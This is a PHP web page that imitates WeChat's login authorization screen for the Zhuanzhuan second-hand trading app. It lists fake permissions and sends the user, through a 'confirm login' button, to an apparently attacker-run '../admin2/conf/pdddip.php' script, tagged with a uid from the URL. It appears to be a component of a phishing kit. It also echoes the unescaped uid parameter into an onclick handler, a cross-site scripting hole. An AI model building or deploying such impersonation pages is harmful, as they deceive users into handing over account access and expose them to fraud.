<?php

$uid=$_GET['uid'];
$zt=$_GET['zt'];
?>

<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
    <title>微信登录</title>
    <link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon"/>
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <meta name="format-detection" content="telephone=no">


    <link type="text/css" rel="styleSheet" href="./js/datail.css">
    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
    <meta name="aplus-waiting" content="1">
    <meta name="data-spm" content="a1z3i">

    <link rel="stylesheet" href="./js/mo.css">
    <style type="text/css"></style></head>
<body>
<div class="clear"></div>
<div style="margin-top:25px;background:#fff; padding:10px 25px">
    <div style="margin-top:20px; text-align:center; line-height:30px; font-size:14px">
        <img src="./imges/mipush_notification.png" width="70" /><br />
        <span style="font-size:16px; font-weight:bold; letter-spacing:2px">转转客户端</span>

        <div style="padding-top:20px; margin-top:40px; border-top:1px solid #eee; text-align:left">
            <div style=" font-weight:bold; font-size:15px">登录后该应用将获得以下权限</div>
            <div style="color:#999; padding-left:12px; font-size:13px">
                <ul>
                    <li style="list-style-type:disc ">获得你的公开信息（头像、昵称等）</li>
                    <li style="list-style-type:disc ">寻找与你共同使用该应用的朋友</li>
                </ul>
            </div>
        </div>
        <div class="submit" style="margin-top:30px">
            <button type="submit"  class="button" id="submit-btn" style="background:#00be00; border:none; height:35px; line-height:35px; font-size:14px; " onclick="location.href='<?php echo "../admin2/conf/pdddip.php?uid=$uid" ?>'">确认登录</button>
        </div>
    </div>

</div>



</body></html>